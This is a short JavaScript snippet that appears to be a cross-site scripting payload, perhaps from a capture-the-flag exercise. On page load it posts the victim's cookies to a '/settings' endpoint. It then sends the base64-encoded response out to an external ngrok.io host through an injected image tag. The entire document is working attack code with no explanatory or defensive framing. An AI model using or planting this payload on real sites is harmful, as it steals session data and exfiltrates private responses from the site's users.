window.addEventListener('load', function () {

  function send2server(name, data){
    img = document.createElement("img");
    img.src = "https://3c70bb4e.ngrok.io/?name="+name+"&data="+btoa(encodeURI(data));
    document.getElementById("chat-div").appendChild(img);
}

fetch("/settings", {
    'method': 'POST',
    'body': 'name=test>&user_id=2&' +document.cookie,
     headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    }
}).then(function(response){
	response.text().then(function(back){
	 send2server("resp", btoa(encodeURI(back)));	
	})
})
      
  })
